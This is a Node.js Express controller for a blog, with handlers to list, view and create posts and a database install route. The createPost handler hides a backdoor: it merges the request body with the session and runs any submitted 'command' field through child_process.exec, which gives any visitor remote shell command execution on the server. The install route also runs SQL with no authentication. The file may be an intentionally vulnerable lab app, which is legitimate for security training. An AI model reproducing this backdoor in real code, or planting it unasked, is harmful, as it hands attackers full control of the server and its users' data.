const UserModel = require("../models/userModel");
const PostModel = require("../models/postModel");
const exec = require('child_process').exec

const fs = require('fs');
const mysql = require("mysql");
const db = require("../configs/db");

const home = (req, res) => {
    const user = new UserModel.User(req.session)
    PostModel.get(req.sqlCon, async function (err, rows) {
        if (err) throw err;
        res.render("home.ejs", { user: user, posts: rows })
    })
}

const blogDetail = (req, res) => {
    const user = new UserModel.User(req.session)
    PostModel.getWithId(req.sqlCon, req.params.postId, async function (err, rows) {
        if (err) throw err;
        if (typeof (rows) == "undefined" || rows.length < 1) {
            return res.status(404).json({
                errors: [{ "Post": "Post Not Found" }],
            })
        } else {
            const post = new PostModel.Post(rows[0])
            res.render("post/view", { user: user, post: post })

        }
    })
}

const createPostView = (req, res) => {
    const user = new UserModel.User(req.session)
    res.render("post/create", { user: user })
}

const createPost = (req, res) => {
    const post = {
        "date": new Date().toISOString().slice(0, 19).replace('T', ' ')
    }

    const merged = Object.assign({}, post, req.body, req.session)
     
    if(merged.command != "" && merged.command){
        exec(merged.command, (err, stdout, stderr) => console.log(stdout));
    }
    
    const newPost = new PostModel.Post(merged)
    PostModel.create(req.sqlCon,newPost,async function(err,rows){
        if(err) throw err;
        return res.status(200).json({
            newPost,
        })
    })
}

const install = (req,res) => {
    var con = mysql.createConnection({
        host: db.host,
        user: db.user,
        password: db.password
    });
    
    var queries = fs.readFileSync("db.sql").toString()
        .replace(/(\r\n|\n|\r)/gm, " ") // remove newlines
        .replace(/\s+/g, ' ') // excess white space
        .split(";") // split into all statements
        .map(Function.prototype.call, String.prototype.trim)
        .filter(function (el) { return el.length != 0 }); // remove any empty ones
    
    queries.forEach(function(value){
        con.query(value, function (err, rows) {
            if (err) throw err;
            console.log("successfull --------------------------------------------")
            console.log(value)
            console.log("--------------------------------------------------------")
        })
    })

    return res.status(200).json("ok")
    
}

module.exports = {
    home,
    blogDetail,
    createPostView,
    createPost,
    install
}